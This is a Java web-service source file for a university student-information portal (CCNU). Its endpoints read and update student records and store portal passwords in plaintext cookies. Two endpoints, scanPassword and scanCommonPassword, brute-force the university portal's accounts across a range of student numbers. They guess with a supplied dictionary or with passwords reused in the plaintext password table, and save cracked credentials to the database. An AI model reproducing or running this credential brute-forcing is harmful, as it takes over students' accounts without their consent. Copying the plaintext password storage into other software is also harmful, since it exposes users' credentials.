/**
 * Author: WuHaoLin
 * Date: 2014/5/15
 * Time: 16:00
 */

package tool.ccnu.student;

import org.glassfish.jersey.server.JSONP;
import org.hibernate.Query;
import org.hibernate.Session;
import tool.HibernateUtil;
import tool.R;
import tool.Tool;
import tool.ccnu.CCNUPortal;
import tool.ccnu.student.detailInfo.StudentAllInfoEntity;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.ws.rs.*;
import javax.ws.rs.core.Context;
import java.util.*;

/**
 * Created with Intellij IDEA.
 * User: WuHaoLin
 * Date: 2014/5/15
 * Time: 16:00
 */
@Path("/studentInfo")
@Produces({"application/javascript"})
public class ServiceStudents {

    @Context
    HttpServletRequest request;

    @Context
    HttpServletResponse response;

    /**
     * 查询一个同学的信息
     *
     * @param XH 如果URL参数中没有XH参数就从Cookies中获得
     * @return 一个学生的信息, 如果没有返回null
     */
    @JSONP(queryParam = R.JSONP_CALLBACK)
    @GET
    @Path("/getOne")
    public StudentsEntity getOneByXH_Query(@QueryParam("XH") String XH) {
        if (XH == null) {
            XH = Tool.getXHMMfromCookie(request)[0];
        }
        StudentsEntity re = ManageStudents.get(XH);
        if (re != null) {
            re.setPassword("");//掩盖密码
            re.setIdNumber("");//掩盖身份证号
        }
        return re;
    }

    @JSONP(queryParam = R.JSONP_CALLBACK)
    @GET
    @Path("/updateOne")
    public StudentsEntity updateBasicInfo(
            @QueryParam("name") String name,
            @QueryParam("phoneNumber") String phoneNumber,
            @QueryParam("qq") String qq,
            @CookieParam("XH") String XH) {
        StudentsEntity one = ManageStudents.get(XH);
        if (one == null) {
            return null;
        } else {
            one.setName(name);
            one.setQq(qq);
            one.setPhoneNumber(phoneNumber);
            HibernateUtil.updateEntity(one);
            return one;
        }
    }

    @JSONP(queryParam = R.JSONP_CALLBACK)
    @GET
    @Path("/bind")
    public int bind(@QueryParam("XH") String XH, @QueryParam("MM") String MM) {
        if (XH == null || MM == null) {
            return -1;//学号密码请填完整哦
        }
        if (CCNUPortal.XHMMisTrue(XH, MM)) {//密码正确
            Tool.setXHMMtoCookies(response, XH, MM);//保存帐号密码到cookies
            return 1;//成功
        } else {//密码错误
            return -2;//密码错误
        }
    }

    /**
     * 暴力破解信息门户账号密码
     * 猜对的会保存到数据库中
     *
     * @param start 开始的学号
     * @param end   结束的学号
     * @param pass  密码字典,同时还会探测和账号一样的密码,多个密码用","隔开
     * @return 成功猜对的个数
     */
    @JSONP(queryParam = R.JSONP_CALLBACK)
    @GET
    @Path("/scanPassword")
    public int scanPassword(@QueryParam("start") String start, @QueryParam("end") String end, @QueryParam("pass") String pass) {
        if (start == null || end == null || pass == null || start.length() != 10 || end.length() != 10) return 0;
        String pa[] = pass.split(",");
        return CCNUPortal.scanPassword(Integer.parseInt(start), Integer.parseInt(end), pa);
    }

    /**
     * 先去已经存在的所有密码中找出出现了1次以上的密码,再使用这些密码去探测
     * 暴力破解信息门户账号密码
     * 猜对的会保存到数据库中
     *
     * @param start 开始的学号
     * @param end   结束的学号
     * @return 成功猜对的个数
     */
    @JSONP(queryParam = R.JSONP_CALLBACK)
    @GET
    @Path("/scanCommonPassword")
    public int scanCommonPassword(@QueryParam("start") String start, @QueryParam("end") String end) {
        Session session = HibernateUtil.getSession();
        Query query = session.createQuery("from StudentAllInfoEntity where password!=null ");
        List<StudentAllInfoEntity> allInfoEntities = query.list();
        HibernateUtil.closeSession(session);
        Map<String, Integer> pass = new HashMap<>();
        for (StudentAllInfoEntity one : allInfoEntities) {
            String password = one.getPassword();
            if (pass.containsKey(one.getPassword())) {
                pass.put(password, pass.get(password) + 1);
            } else {
                pass.put(password, 1);
            }
        }
        List<String> commonPassword = new LinkedList<>();
        for (Map.Entry<String, Integer> one : pass.entrySet()) {
            if (one.getValue() > 1) {
                commonPassword.add(one.getKey());
            }
        }
        String[] commonPasswordArray = new String[commonPassword.size()];
        for (int i = 0; i < commonPassword.size(); i++) {
            commonPasswordArray[i] = commonPassword.get(i);
        }
        System.out.println(Arrays.toString(commonPasswordArray));
        return CCNUPortal.scanPassword(Integer.parseInt(start), Integer.parseInt(end), commonPasswordArray);
    }


}
